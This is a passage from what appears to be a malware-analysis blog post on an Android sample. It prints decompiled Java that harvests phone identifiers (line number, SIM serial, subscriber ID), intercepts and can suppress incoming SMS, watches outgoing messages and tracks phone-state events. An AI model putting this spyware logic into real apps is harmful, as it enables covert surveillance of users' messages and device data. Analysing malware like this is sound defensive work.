            <span class="n">String</span> <span class="n">str</span> <span class="p">=</span> <span class="n">deviceId</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">deviceId</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">str</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">str</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">GetLine1Number</span><span class="p">()</span> <span class="p">{</span>
            <span class="n">String</span> <span class="n">line1Number</span> <span class="p">=</span> <span class="p">((</span><span class="n">TelephonyManager</span><span class="p">)</span> <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getSystemService</span><span class="p">(</span><span class="s">"phone"</span><span class="p">)).</span><span class="nf">getLine1Number</span><span class="p">();</span>
            <span class="n">String</span> <span class="n">str</span> <span class="p">=</span> <span class="n">line1Number</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">line1Number</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">str</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">str</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">GetSimSerialNumber</span><span class="p">()</span> <span class="p">{</span>
            <span class="n">String</span> <span class="n">simSerialNumber</span> <span class="p">=</span> <span class="p">((</span><span class="n">TelephonyManager</span><span class="p">)</span> <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getSystemService</span><span class="p">(</span><span class="s">"phone"</span><span class="p">)).</span><span class="nf">getSimSerialNumber</span><span class="p">();</span>
            <span class="n">String</span> <span class="n">str</span> <span class="p">=</span> <span class="n">simSerialNumber</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">simSerialNumber</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">str</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">str</span><span class="p">;</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">static</span> <span class="n">String</span> <span class="nf">GetSubscriberId</span><span class="p">()</span> <span class="p">{</span>
            <span class="n">String</span> <span class="n">subscriberId</span> <span class="p">=</span> <span class="p">((</span><span class="n">TelephonyManager</span><span class="p">)</span> <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getSystemService</span><span class="p">(</span><span class="s">"phone"</span><span class="p">)).</span><span class="nf">getSubscriberId</span><span class="p">();</span>
            <span class="n">String</span> <span class="n">str</span> <span class="p">=</span> <span class="n">subscriberId</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">subscriberId</span> <span class="p">==</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">str</span> <span class="p">=</span> <span class="s">""</span><span class="p">;</span>
            <span class="p">}</span>
            <span class="k">return</span> <span class="n">str</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</code></pre></div></div>
<p>The malware will collect info about the lock of the phone if it has lock or not or make the phone wake or uses voice lock. And gets info about network type using <code class="language-plaintext highlighter-rouge">GetNetworkType()</code> class. And get info about phone type using <code class="language-plaintext highlighter-rouge">GetPhoneType()</code>.</p>

<p>We go for <code class="language-plaintext highlighter-rouge">PhoneEvents</code> class. In this class, the malware will intercept the SMS comming to the victim’s phone.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  <span class="n">@BA</span><span class="p">.</span><span class="nf">ShortName</span><span class="p">(</span><span class="s">"SmsInterceptor"</span><span class="p">)</span>
    <span class="cm">/* loaded from: classes-dex2jar.jar:anywheresoftware/b4a/phone/PhoneEvents$SMSInterceptor.class */</span>
    <span class="k">public</span> <span class="k">static</span> <span class="k">class</span> <span class="nc">SMSInterceptor</span> <span class="p">{</span>
        <span class="k">private</span> <span class="n">BA</span> <span class="n">ba</span><span class="p">;</span>
        <span class="k">private</span> <span class="n">BroadcastReceiver</span> <span class="n">br</span><span class="p">;</span>
        <span class="k">private</span> <span class="n">String</span> <span class="n">eventName</span><span class="p">;</span>

        <span class="k">public</span> <span class="k">void</span> <span class="nf">Initialize</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="n">BA</span> <span class="n">ba</span><span class="p">)</span> <span class="p">{</span>
            <span class="nf">Initialize2</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">ba</span><span class="p">,</span> <span class="m">0</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">void</span> <span class="nf">Initialize2</span><span class="p">(</span><span class="n">String</span> <span class="n">str</span><span class="p">,</span> <span class="n">final</span> <span class="n">BA</span> <span class="n">ba</span><span class="p">,</span> <span class="kt">int</span> <span class="n">i</span><span class="p">)</span> <span class="p">{</span>
            <span class="k">this</span><span class="p">.</span><span class="n">ba</span> <span class="p">=</span> <span class="n">ba</span><span class="p">;</span>
            <span class="k">this</span><span class="p">.</span><span class="n">eventName</span> <span class="p">=</span> <span class="n">str</span><span class="p">.</span><span class="nf">toLowerCase</span><span class="p">(</span><span class="n">BA</span><span class="p">.</span><span class="n">cul</span><span class="p">);</span>
            <span class="k">this</span><span class="p">.</span><span class="n">br</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">BroadcastReceiver</span><span class="p">()</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.SMSInterceptor.2</span>
                <span class="n">@Override</span> <span class="c1">// android.content.BroadcastReceiver</span>
                <span class="k">public</span> <span class="k">void</span> <span class="nf">onReceive</span><span class="p">(</span><span class="n">Context</span> <span class="n">context</span><span class="p">,</span> <span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">Bundle</span> <span class="n">extras</span><span class="p">;</span>
                    <span class="n">SMSInterceptor</span> <span class="n">sMSInterceptor</span><span class="p">;</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">intent</span><span class="p">.</span><span class="nf">getAction</span><span class="p">().</span><span class="k">equals</span><span class="p">(</span><span class="s">"android.provider.Telephony.SMS_RECEIVED"</span><span class="p">)</span> <span class="p">&amp;&amp;</span> <span class="p">(</span><span class="n">extras</span> <span class="p">=</span> <span class="n">intent</span><span class="p">.</span><span class="nf">getExtras</span><span class="p">())</span> <span class="p">!=</span> <span class="k">null</span><span class="p">)</span> <span class="p">{</span>
                        <span class="k">for</span> <span class="p">(</span><span class="n">Object</span> <span class="n">obj</span> <span class="p">:</span> <span class="p">(</span><span class="n">Object</span><span class="p">[])</span> <span class="n">extras</span><span class="p">.</span><span class="k">get</span><span class="p">(</span><span class="s">"pdus"</span><span class="p">))</span> <span class="p">{</span>
                            <span class="n">SmsMessage</span> <span class="n">createFromPdu</span> <span class="p">=</span> <span class="n">SmsMessage</span><span class="p">.</span><span class="nf">createFromPdu</span><span class="p">((</span><span class="kt">byte</span><span class="p">[])</span> <span class="n">obj</span><span class="p">);</span>
                            <span class="n">Boolean</span> <span class="kt">bool</span> <span class="p">=</span> <span class="p">(</span><span class="n">Boolean</span><span class="p">)</span> <span class="n">ba</span><span class="p">.</span><span class="nf">raiseEvent</span><span class="p">(</span><span class="n">SMSInterceptor</span><span class="p">.</span><span class="k">this</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">sMSInterceptor</span><span class="p">.</span><span class="n">eventName</span><span class="p">)</span> <span class="p">+</span> <span class="s">"_messagereceived"</span><span class="p">,</span> <span class="n">createFromPdu</span><span class="p">.</span><span class="nf">getOriginatingAddress</span><span class="p">(),</span> <span class="n">createFromPdu</span><span class="p">.</span><span class="nf">getMessageBody</span><span class="p">());</span>
                            <span class="k">if</span> <span class="p">(</span><span class="kt">bool</span> <span class="p">!=</span> <span class="k">null</span> <span class="p">&amp;&amp;</span> <span class="kt">bool</span><span class="p">.</span><span class="nf">booleanValue</span><span class="p">())</span> <span class="p">{</span>
                                <span class="nf">abortBroadcast</span><span class="p">();</span>
                            <span class="p">}</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">};</span>
            <span class="n">IntentFilter</span> <span class="n">intentFilter</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">IntentFilter</span><span class="p">(</span><span class="s">"android.provider.Telephony.SMS_RECEIVED"</span><span class="p">);</span>
            <span class="n">intentFilter</span><span class="p">.</span><span class="nf">setPriority</span><span class="p">(</span><span class="n">i</span><span class="p">);</span>
            <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">registerReceiver</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">br</span><span class="p">,</span> <span class="n">intentFilter</span><span class="p">);</span>
        <span class="p">}</span>

        <span class="k">public</span> <span class="k">void</span> <span class="nf">ListenToOutgoingMessages</span><span class="p">()</span> <span class="p">{</span>
            <span class="n">final</span> <span class="n">Uri</span> <span class="n">parse</span> <span class="p">=</span> <span class="n">Uri</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="s">"content://sms"</span><span class="p">);</span>
            <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getContentResolver</span><span class="p">().</span><span class="nf">registerContentObserver</span><span class="p">(</span><span class="n">parse</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ContentObserver</span><span class="p">(</span><span class="k">new</span> <span class="nf">Handler</span><span class="p">())</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.SMSInterceptor.1</span>
                <span class="n">@Override</span> <span class="c1">// android.database.ContentObserver</span>
                <span class="k">public</span> <span class="k">void</span> <span class="nf">onChange</span><span class="p">(</span><span class="n">boolean</span> <span class="n">z</span><span class="p">)</span> <span class="p">{</span>
                    <span class="n">super</span><span class="p">.</span><span class="nf">onChange</span><span class="p">(</span><span class="n">z</span><span class="p">);</span>
                    <span class="n">Cursor</span> <span class="n">query</span> <span class="p">=</span> <span class="n">BA</span><span class="p">.</span><span class="n">applicationContext</span><span class="p">.</span><span class="nf">getContentResolver</span><span class="p">().</span><span class="nf">query</span><span class="p">(</span><span class="n">parse</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                    <span class="k">if</span> <span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">moveToNext</span><span class="p">())</span> <span class="p">{</span>
                        <span class="n">String</span> <span class="kt">string</span> <span class="p">=</span> <span class="n">query</span><span class="p">.</span><span class="nf">getString</span><span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"protocol"</span><span class="p">));</span>
                        <span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="n">query</span><span class="p">.</span><span class="nf">getInt</span><span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"type"</span><span class="p">));</span>
                        <span class="k">if</span> <span class="p">(</span><span class="kt">string</span> <span class="p">==</span> <span class="k">null</span> <span class="p">&amp;&amp;</span> <span class="n">i</span> <span class="p">==</span> <span class="m">2</span><span class="p">)</span> <span class="p">{</span>
                            <span class="n">BA</span> <span class="n">ba</span> <span class="p">=</span> <span class="n">SMSInterceptor</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">ba</span><span class="p">;</span>
                            <span class="n">ba</span><span class="p">.</span><span class="nf">raiseEvent</span><span class="p">(</span><span class="k">null</span><span class="p">,</span> <span class="n">String</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">SMSInterceptor</span><span class="p">.</span><span class="k">this</span><span class="p">.</span><span class="n">eventName</span><span class="p">)</span> <span class="p">+</span> <span class="s">"_messagesent"</span><span class="p">,</span> <span class="n">Integer</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">getInt</span><span class="p">(</span><span class="n">query</span><span class="p">.</span><span class="nf">getColumnIndex</span><span class="p">(</span><span class="s">"_id"</span><span class="p">))));</span>
                            <span class="n">query</span><span class="p">.</span><span class="nf">close</span><span class="p">();</span>
                        <span class="p">}</span>
                    <span class="p">}</span>
                <span class="p">}</span>
            <span class="p">});</span>
        <span class="p">}</span>
</code></pre></div></div>

<p>And the malware will try to know more about the state of the phone such as if the phone is shutdown or screan is OFF, an app is removed, an app is added, or the state of battary.</p>

<div class="language-cs highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">public</span> <span class="nf">PhoneEvents</span><span class="p">()</span> <span class="p">{</span>
        <span class="n">HashMap</span><span class="p">&lt;</span><span class="n">String</span><span class="p">,</span> <span class="n">ActionHandler</span><span class="p">&gt;</span> <span class="n">hashMap</span> <span class="p">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="p">&lt;&gt;();</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span> <span class="p">=</span> <span class="n">hashMap</span><span class="p">;</span>
        <span class="n">hashMap</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.speech.tts.TTS_QUEUE_PROCESSING_COMPLETED"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.1</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_texttospeechfinish"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.net.conn.CONNECTIVITY_CHANGE"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.2</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_connectivitychanged"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="n">NetworkInfo</span> <span class="n">networkInfo</span> <span class="p">=</span> <span class="p">(</span><span class="n">NetworkInfo</span><span class="p">)</span> <span class="n">intent</span><span class="p">.</span><span class="nf">getParcelableExtra</span><span class="p">(</span><span class="s">"networkInfo"</span><span class="p">);</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="n">networkInfo</span><span class="p">.</span><span class="nf">getTypeName</span><span class="p">(),</span> <span class="n">networkInfo</span><span class="p">.</span><span class="nf">getState</span><span class="p">().</span><span class="nf">toString</span><span class="p">()});</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.intent.action.USER_PRESENT"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.3</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_userpresent"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.intent.action.ACTION_SHUTDOWN"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.4</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_shutdown"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.intent.action.SCREEN_ON"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.5</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_screenon"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.intent.action.SCREEN_OFF"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.6</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_screenoff"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.intent.action.PACKAGE_REMOVED"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.7</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_packageremoved"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="n">intent</span><span class="p">.</span><span class="nf">getDataString</span><span class="p">()});</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.intent.action.PACKAGE_ADDED"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.8</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_packageadded"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="n">intent</span><span class="p">.</span><span class="nf">getDataString</span><span class="p">()});</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.intent.action.DEVICE_STORAGE_LOW"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.9</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_devicestoragelow"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"b4a.smssent"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.10</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_smssentstatus"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="kt">int</span> <span class="n">i</span> <span class="p">=</span> <span class="k">this</span><span class="p">.</span><span class="n">resultCode</span><span class="p">;</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="n">Boolean</span><span class="p">.</span><span class="nf">valueOf</span><span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="n">resultCode</span> <span class="p">==</span> <span class="p">-</span><span class="m">1</span><span class="p">),</span> <span class="n">i</span> <span class="p">!=</span> <span class="p">-</span><span class="m">1</span> <span class="p">?</span> <span class="n">i</span> <span class="p">!=</span> <span class="m">1</span> <span class="p">?</span> <span class="n">i</span> <span class="p">!=</span> <span class="m">2</span> <span class="p">?</span> <span class="n">i</span> <span class="p">!=</span> <span class="m">3</span> <span class="p">?</span> <span class="n">i</span> <span class="p">!=</span> <span class="m">4</span> <span class="p">?</span> <span class="s">""</span> <span class="p">:</span> <span class="s">"NO_SERVICE"</span> <span class="p">:</span> <span class="s">"NULL_PDU"</span> <span class="p">:</span> <span class="s">"RADIO_OFF"</span> <span class="p">:</span> <span class="s">"GENERIC_FAILURE"</span> <span class="p">:</span> <span class="s">"OK"</span><span class="p">,</span> <span class="n">intent</span><span class="p">.</span><span class="nf">getStringExtra</span><span class="p">(</span><span class="s">"phone"</span><span class="p">)});</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"b4a.smsdelivered"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.11</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_smsdelivered"</span><span class="p">;</span>
            <span class="p">}</span>

            <span class="n">@Override</span> <span class="c1">// anywheresoftware.b4a.phone.PhoneEvents.ActionHandler</span>
            <span class="k">public</span> <span class="k">void</span> <span class="nf">handle</span><span class="p">(</span><span class="n">Intent</span> <span class="n">intent</span><span class="p">)</span> <span class="p">{</span>
                <span class="nf">send</span><span class="p">(</span><span class="n">intent</span><span class="p">,</span> <span class="k">new</span> <span class="n">Object</span><span class="p">[]{</span><span class="n">intent</span><span class="p">.</span><span class="nf">getStringExtra</span><span class="p">(</span><span class="s">"phone"</span><span class="p">)});</span>
            <span class="p">}</span>
        <span class="p">});</span>
        <span class="k">this</span><span class="p">.</span><span class="n">map</span><span class="p">.</span><span class="nf">put</span><span class="p">(</span><span class="s">"android.intent.action.DEVICE_STORAGE_OK"</span><span class="p">,</span> <span class="k">new</span> <span class="nf">ActionHandler</span><span class="p">(</span><span class="k">this</span><span class="p">)</span> <span class="p">{</span> <span class="c1">// from class: anywheresoftware.b4a.phone.PhoneEvents.12</span>
            <span class="cm">/* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */</span>
            <span class="p">{</span>
                <span class="nf">super</span><span class="p">(</span><span class="k">this</span><span class="p">,</span> <span class="k">null</span><span class="p">);</span>
                <span class="k">this</span><span class="p">.</span><span class="k">event</span> <span class="p">=</span> <span class="s">"_devicestorageok"</span><span class="p">;</span>
            <span class="p">}</span>

